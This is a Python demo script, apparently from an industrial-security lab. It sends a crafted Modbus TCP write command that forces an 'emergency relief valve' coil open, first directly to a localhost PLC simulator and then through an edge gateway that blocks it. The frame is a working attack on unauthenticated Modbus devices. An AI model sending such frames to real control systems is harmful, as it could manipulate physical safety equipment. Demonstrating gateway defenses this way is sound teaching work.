import socket
import struct

HOST = "127.0.0.1"
PLC_PORT = 5020      # Direct Unsecured PLC Port (Bypassing Edge Gateway)
GATEWAY_PORT = 5021  # Secured Edge Gateway Port

def simulate_unsecured_attack():
    print("=" * 75)
    print("SCENARIO A: UNSECURED ATTACK DIRECTLY ON PLC (PORT 5020)")
    print("=" * 75)
    
    # Craft a malicious Modbus TCP frame: Unit ID 3 (Rogue Attacker), Function Code 5 (Write Single Coil), 
    # Address 0 (Emergency Relief Valve), Value 0xFF00 (Force Open / Manipulate)
    malicious_frame = struct.pack(">HHHBBHH", 100, 0, 6, 3, 5, 0, 0xFF00)
    
    print("[ATTACKER] Sending unauthenticated Modbus TCP Write (FC=05) directly to PLC at 127.0.0.1:5020...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PLC_PORT))
            s.sendall(malicious_frame)
            response = s.recv(1024)
            print(f"[PLC] Response received ({len(response)} bytes).")
            print("[CRITICAL VULNERABILITY] Direct Modbus PLC accepted the unauthorized command instantly!")
            print("[CRITICAL VULNERABILITY] Zero authentication, zero trust evaluation, zero logging of attacker ID.")
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")

def simulate_secured_attempt():
    print("\n" + "=" * 75)
    print("SCENARIO B: SAME ATTACK THROUGH EDGE GATEWAY CONDUIT (PORT 5021)")
    print("=" * 75)
    
    malicious_frame = struct.pack(">HHHBBHH", 101, 0, 6, 3, 5, 0, 0xFF00)
    
    print("[ATTACKER] Sending same malicious Modbus TCP Write (FC=05) through Edge Gateway at 127.0.0.1:5021...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, GATEWAY_PORT))
            s.sendall(malicious_frame)
            response = s.recv(1024)
            
            is_exception = (len(response) >= 8 and (response[7] & 0x80) != 0)
            if is_exception:
                print(f"[GATEWAY DEFENSE] Attack blocked successfully! Returned Modbus Exception Code (0x85).")
                print(f"[GATEWAY DEFENSE] Rogue Unit ID 3 has trust score 0 (Unregistered). Access denied.")
            else:
                print("[WARNING] Unexpected response.")
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")

if __name__ == "__main__":
    simulate_unsecured_attack()
    simulate_secured_attempt()
